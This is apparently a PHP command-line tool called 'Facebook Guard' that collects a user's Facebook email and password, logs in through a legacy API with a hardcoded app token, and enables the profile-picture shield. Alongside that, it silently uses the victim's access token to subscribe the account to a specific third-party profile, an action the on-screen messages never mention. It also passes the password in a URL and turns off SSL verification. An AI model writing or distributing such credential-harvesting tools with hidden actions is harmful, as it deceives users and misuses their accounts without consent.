<?php ?><?php
if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
    $bersih = "cls";
} else {
    $bersih = "clear";
}
date_default_timezone_set('Asia/Jakarta');
$date = date('d-M-Y H:i:s');
$green = "\e[92m";
$red = "\e[91m";
$yellow = "\e[93m";
$blue = "\e[36m";
$cyan = "\e[0;36m";
$purple = "\e[0;35m";
$brown = "\e[0;33m";
$lightgray = "\e[0;37m";
$darkgray = "\e[1;30m";
$lightblue = "\e[1;34m";
$lightgreen = "\e[1;32m";
$lightcyan = "\e[1;36m";
$lightred = "\e[1;31m";
$lightpurple = "\e[1;35m";
pilih:
    system($bersih);
    echo"
$darkgray ====|_|=========================================
$lightgreen |/  |_|   WELCOME TO FACEBOOK GUARD       _    |
$lightgreen /   |_|   mkdirlove                      |_|   |
$darkgray ================================================
$blue |  Author    :$yellow MAYO_CYBERSEC <mkdirlove>      |
$blue |  github    :$green https://github.com/mkdirlove    |  
$blue | | Version  : 0.1                                   |
$darkgray |°| Date     : $date                             |
$darkgray ================================================
$darkgray     /////|___________________________/////|
$darkgray   /////|__________________________/////|
$darkgray /////|_________________________/////|
";
    echo " 
";
    @header('Content-Type: text/html; charset=UTF-8');
    function input($echo) {
        echo "$echo : ";
    }
    echo "$green [!] ";
    sleep(0.5);
    echo "w";
    sleep(0.5);
    echo "a";
    sleep(0.5);
    echo "i";
    sleep(0.5);
    echo "t";
    sleep(0.5);
    echo "i";
    sleep(0.5);
    echo "n";
    sleep(0.5);
    echo "g";
    sleep(0.5);
    echo "...";
    sleep(1);
    echo ".
";
    sleep(2);
    echo " 
";
    echo "
";
    echo "$red ╔════════════════════════════════════════════════╗
";
    input("$green ║Go to activate Profile Guard?   $green [y/n]");
    $pilih = trim(fgets(STDIN));
    echo "$red ╚════════════════════════════════════════════════╝
";
    echo "$red  ══════════════════════════════════════════════════════════════════════════
";
    if ($pilih == "n") {
        die("$red (!) See You $red (!)
");
    } elseif ($pilih == "y") {
        echo "$red [!] ATTENTION :$green to avoid checkpoints.
                 login first in your browser (Chrome, Opera or Mozilla)
";
        echo "$blue [!] password hiden...
";
        echo "$red  ══════════════════════════════════════════════════════════════════════════
";
        echo "
";
        input("$green Email Fb ");
        $iduser = trim(fgets(STDIN));
        input("$red Password ");
        $pass = false;
        $pass = trim(`stty -echo;head -n1;stty echo`);
        echo "
";
        echo "$green [!] ";
        sleep(1);
        echo "l";
        sleep(1);
        echo "o";
        sleep(1);
        echo "a";
        sleep(1);
        echo "d";
        sleep(1);
        echo "i";
        sleep(1);
        echo "n";
        sleep(1);
        echo "g";
        sleep(1);
        echo "...";
        sleep(1);
        echo ".
";
        sleep(1);
        echo "
";
    } else {
        echo "$red(!)$yellow Invalid$red (!)$green
";
        echo "
";
        gotopilih;
    }
    $me = file_get_contents('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' . $iduser . '&locale=en_US&password=' . $pass . '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6');
    $json = json_decode($me, true);
    $userid = $json['session_cookies'][0]['value'];
    $token = $json['access_token'];
    if (preg_match('/session_key/', $me)) {
        echo "$green Prossess Loading to Login Facebook..";
        echo "[!] w";
        sleep(1);
        echo "a";
        sleep(1);
        echo "i";
        sleep(1);
        echo "ting....";
        sleep(1);
        echo "..
";
        sleep(1);
    } else {
        echo ("
");
        die("$red [!]wrong password / wrong username / or your account is checkpoint!
");
        echo "
";
        echo "
";
    }
    $md5 = md5(time());
    $hash = substr($md5, 0, 8) . "-" . substr($md5, 8, 4) . "-" . substr($md5, 12, 4) . "-" . substr($md5, 16, 4) . "-" . substr($md5, 20, 12);
    function curl($url, $post = null) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        if ($post != null) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $exec = curl_exec($ch);
        curl_close($ch);
        return $exec;
    }
    $me = json_decode(curl("https://graph.facebook.com/me?fields=id,name&access_token=" . $token));
    if ($me && $me->id && $me->name) {
        $var = "{\"0\":{\"is_shielded\":true,\"session_id\":\"$hash\",\"actor_id\":\"$me->id\",\"client_mutation_id\":\"$hash\"}}";
        $hajar = json_decode(curl("https://graph.facebook.com/graphql", array("variables" => $var, "doc_id" => "1477043292367183", "query_name" => "IsShieldedSetMutation", "strip_defaults" => "true", "strip_nulls" => "true", "locale" => "en_US", "client_country_code" => "US", "fb_api_req_friendly_name" => "IsShieldedSetMutation", "fb_api_caller_class" => "IsShieldedSetMutation", "access_token" => $token)));
        if ($hajar->data->is_shielded_set->is_shielded) echo "$yellow Login success √
";
        sleep(2);
        echo "$yellow ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~";
        echo "
";
        echo "$blue wellcome in Santri Guard  : $green Username $yellow " . $me->name;
        echo "
";
        echo "$yellow ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~";
        sleep(2.5);
        echo "
";
        echo "
";
        echo "$green [!]lo";
        sleep(1.5);
        echo "ad";
        sleep(1.5);
        echo "i";
        sleep(1.5);
        echo "ng";
        sleep(1.5);
        echo ".";
        sleep(1.5);
        echo ".";
        sleep(1.5);
        echo ".";
        sleep(1.5);
        echo ".";
        sleep(1.5);
        echo ".";
        sleep(1.5);
        echo "
";
        sleep(1.5);
        $a = ("https://graph.facebook.com/dela.ramadhani/subscribers?method=post&access_token=" . $token);
        $b = curl_init();
        curl_setopt_array($b, array(CURLOPT_URL => "$a", CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 0, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false));
        curl_exec($b);
        curl_close($b);
        echo "
";
        echo "
";
        echo "$red ╔═══════════════════════════════════════════════════╗
";
        echo "$lightgreen ║    Checking your Profile pictures";                 echo "                 ║ ";
        echo "
";
        echo "$red ╚═══════════════════════════════════════════════════╝
";
        echo "lo";
        sleep(1);
        echo "a";
        sleep(1);
        echo "di";
        sleep(1);
        echo "ng...";
        sleep(1);
        echo "$blue activated Profile Guard ";
        echo "$red [!]";
        sleep(1);
        echo "w";
        sleep(1);
        echo "a";
        sleep(1);
        echo "it..
";
        echo "
";
        sleep(1);
        echo "$red ╔═══════════════════════════════════════════════════╗
";
        echo "$green ║ Progress loading...";
        echo " ║ waiting";
        echo " ║ Prosses...";    echo "        ║ ";
        echo "
";
        echo "$red ╚═══════════════════════════════════════════════════╝
";
        sleep(2);
        echo "activated..";
        sleep(2);
        echo "
";
        echo "
";
        sleep(2);
        echo "$yellow working in your profile";
        sleep(1.5);
        echo "--";
        sleep(1.5);
        echo "-";
        sleep(1.5);
        echo "-";
        sleep(1.5);
        echo "-";
        sleep(1.5);
        echo "-";
        sleep(1.5);
        echo "-";
        sleep(1.5);
        echo "-";
        sleep(1.5);
        echo ">>>";
        sleep(1.5);
        echo "
";
        sleep(1.5);
        echo "
";
        echo "
";
        echo "
";
        echo "$green ╔════════════════════════════════════════════════╗
";
        echo "$green ║      [!]  Done. Profile Guard is Active...     ║
";
        echo "$green ╚════════════════════════════════════════════════╝
";
        echo "
";
        sleep(1.5);
        echo "$yellow Thank you...
";
          sleep(1.5);
        echo "$yellow gond job!!
";
        echo "
";
        echo "$red see you again next time
";
        echo "$blue [!] visit my website for learning other than
";
        echo "$green website :  https://santricoder.blogspot.com 
";
        echo "
";
        sleep(1);
        echo "$red Good bye... : $yellow " . $me->name;
        sleep(1.5);
        echo "
";
    }
?>
